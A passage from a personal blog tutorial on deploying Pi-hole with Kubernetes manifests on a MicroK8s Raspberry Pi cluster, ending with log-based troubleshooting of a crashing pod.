aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We’re defining 2 volumes with <code>1GB</code> of storage to bind with <code>StorageClass</code> named manual in the host filesystem path <code>~/pihole/data</code> (same path we created in the first step above). Keep in mind this path as we’ll come back to this later.
We can create both PVs by running:</p>
<p>The final step to set up the storage is to create the two <code>PersistentVolumeClaims</code>. Here are the two specifications for them (<code>claim-etc.yaml</code> and <code>claim-dnsmasq.yam</code>l, respectively):</p>
<p>And create the PVCs:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl apply </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> volume-etc.yaml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kubectl apply </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> volume-dnsmasq.yaml</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Great, let’s verify that the storage is running set up correctly. It should look something like this:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl get sc,pv,pvc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME                                 PROVISIONER   RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">storageclass.storage.k8s.io/manual   manual        Delete          Immediate           </span><span class="token boolean" style="color:#36acaa">false</span><span class="token plain">                  3m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME                              CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                            STORAGECLASS   REASON   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persistentvolume/pihole-dnsmasq   1Gi        RWO            Retain           Bound    pihole/pihole-dnsmasq-pv-claim   manual                  2m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persistentvolume/pihole-volume    1Gi        RWO            Retain           Bound    pihole/pihole-etc-pv-claim       manual                  2m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME                                            STATUS   VOLUME           CAPACITY   ACCESS MODES   STORAGECLASS   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persistentvolumeclaim/pihole-dnsmasq-pv-claim   Bound    pihole-dnsmasq   1Gi        RWO            manual         1m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persistentvolumeclaim/pihole-etc-pv-claim       Bound    pihole-volume    1Gi        RWO            manual         1m</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can see that the <code>PersistentVolumeClaims</code>s are bound to their respective <code>PersistentVolume</code> and the <code>PersistentVolume</code>s are bound to the <code>StorageClass</code>. Looks good!
Now that we have the storage set up, we need to create two more specifications:</p>
<ol>
<li>A <code>Service</code> to specify the access to Pihole.</li>
<li>A <code>Deployment</code> which will pull the latest Pihole image from Dockerhub, create a container from this image, allow the Pod to use the storage we set up to hold its data and configuration files and bind to a Service so that we can access Pihole dashboard.</li>
</ol>
<p>Let’s start with the service <code>svc.yaml</code>. We’ll expose the Pihole server externally so we can access it from within our network. To do that, we need to know our internal IP address. We can find it easily by running:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">hostname</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cut</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" "</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">10.100</span><span class="token plain">.102.95</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can then use that value to finish off our <code>Service</code> specifications:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">selector</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">app</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">clusterIP</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 10.152.183.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">ports</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">port</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">targetPort</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">admin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">port</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">targetPort</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">protocol</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> TCP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> dns</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">port</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">targetPort</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">protocol</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> UDP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> dns</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">udp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">externalIPs</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> 10.100.102.95</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We then need to create the <code>Deployment</code> which binds the storage and network settings together. This is what it looks like (<code>deployment.yaml</code>):</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> apps/v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Deployment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">labels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">app</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">replicas</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">selector</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">matchLabels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">app</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">template</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">labels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token key atrule" style="color:#00a4db">app</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">containers</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          </span><span class="token key atrule" style="color:#00a4db">image</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole/pihole</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          </span><span class="token key atrule" style="color:#00a4db">env</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> TZ</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              </span><span class="token key atrule" style="color:#00a4db">value</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'Asia/Jerusalem'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> WEBPASSWORD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              </span><span class="token key atrule" style="color:#00a4db">value</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'YOUR_PASSWORD'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> TEMPERATUREUNIT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              </span><span class="token key atrule" style="color:#00a4db">value</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          </span><span class="token key atrule" style="color:#00a4db">volumeMounts</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">local</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">etc</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">volume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              </span><span class="token key atrule" style="color:#00a4db">mountPath</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'/etc/pihole'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">local</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">dnsmasq</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">volume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              </span><span class="token key atrule" style="color:#00a4db">mountPath</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'/etc/dnsmasq.d'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">volumes</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">local</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">etc</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">volume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          </span><span class="token key atrule" style="color:#00a4db">persistentVolumeClaim</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token key atrule" style="color:#00a4db">claimName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">etc</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">pv</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">claim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">local</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">dnsmasq</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">volume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          </span><span class="token key atrule" style="color:#00a4db">persistentVolumeClaim</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token key atrule" style="color:#00a4db">claimName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">dnsmasq</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">pv</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">claim</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Most of this is boilerplate and optional. The important sectors are the volumes where we specify the PVC bindings and the matchLabels which binds the <code>Service</code> to the <code>Deployment</code>. Also, you can set a password for the Pihole dashboard admin page by changing the value of <code>spec.template.spec.containers[0].WEBPASSWORD</code>.
I ran the following command to create the deployment:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl apply </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> deployment.yaml</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Unfortunately, I noticed that the pihole <code>Pod</code> was in a <code>CrashLoopBackoff</code>!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="troubleshooting-pihole-pod-crashloopbackoff">Troubleshooting PiHole Pod CrashLoopBackOff<a href="https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004#troubleshooting-pihole-pod-crashloopbackoff" class="hash-link" aria-label="Direct link to Troubleshooting PiHole Pod CrashLoopBackOff" title="Direct link to Troubleshooting PiHole Pod CrashLoopBackOff">​</a></h2>
<p>The first step in troubleshooting a <code>CrashLoopBackoff</code> is to review the <code>Pod</code> logs. This is what I saw:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl logs pihole-64678974cd-p7spj </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">::: Preexisting ad list /etc/pihole/adlists.list detected </span><span class="token variable punctuation" style="color:#393A34">((</span><span class="token variable" style="color:#36acaa">exiting setup_blocklists early</span><span class="token variable punctuation" style="color:#393A34">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dnsmasq: bad option at line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> of /etc/dnsmasq.d/adlists.list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">::: Testing pihole-FTL DNS: </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cont-init.d</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token plain">-start.sh: exited </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cont-finish.d</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> executing container finish scripts</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cont-finish.d</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">s6-finish</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> waiting </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> services.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">s6-finish</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> sending all processes the </span><span class="token environment constant" style="color:#36acaa">TERM</span><span class="token plain"> signal.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So it seemed that there was some sort of unexpected issue when reading a file named adlists.list. But since the <code>Pod</code> was in a <code>CrashLoopBackoff</code>, I could not have direct access to the Pod to check the file because it was constantly restarting.
Therefore, I went the hard route and decided to download the pihole image to review the source code and pinpoint the failure.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="installing-docker-to-troubleshoot-image-initialization-failure">Installing Docker to Troubleshoot Image Initialization Failure<a href="https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004#installing-docker-to-troubleshoot-image-initialization-failure" class="hash-link" aria-label="Direct link to Installing Docker to Troubleshoot Image Initialization Failure" title="Direct link to Installing Docker to Troubleshoot Image Initialization Failure">​</a></h2>
<p>To install Docker on the Raspberry Pi, I needed to figure out first what architecture the processor is running.
I ran the following command and found that the I was running <code>aarch64</code>:</p>
